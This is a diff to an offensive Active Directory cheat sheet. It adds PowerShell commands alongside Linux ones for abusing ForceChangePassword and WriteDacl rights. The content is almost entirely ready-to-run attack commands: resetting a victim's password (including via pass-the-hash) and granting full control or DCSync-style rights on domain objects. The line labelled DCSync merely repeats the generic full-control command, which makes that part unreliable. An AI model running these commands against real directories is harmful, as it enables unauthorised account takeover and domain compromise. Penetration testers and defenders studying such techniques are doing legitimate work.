@@ -4,6 +4,8 @@
 
 ## ForceChangePassword on User
 
+### Linux
+
 ```bash
 net rpc password targetUser -U domain.com/username%password -S dc.domain.com #Insert passwor
 # rpcclient
@@ -11,6 +13,13 @@ rpcclient -U domain.com/user dcIP
 rpcclient $> setuserinfo2 targetUser 23 newPassUser
 # Computer -> User
 pth-net rpc password "targetUser" "newPassword" -U "domain.com"/'COMPUTER1$'%"NT":"LM" -S "dcIP"
+```
+
+### Windows
+
+```powershell
+$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 ```
 
 ## GenericWrite on User
@@ -44,10 +53,21 @@ ldap_con.unbind()
 
 ## WriteDacl on User
 
+### Linux
+
 ```bash
 dacledit.py -action 'read' -principal username -target 'targetUsername' 'domain.com'/'username':'password'
 dacledit.py -action 'write' -rights 'FullControl' -principal username -target 'targetUsername' 'domain.com'/'username':'password'
 ## Now you can abuse GenericWrite 
+```
+
+### Windows
+
+```powershell
+# Give full control
+Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
+# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
+Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
 ```
 
 ## Add self on Group
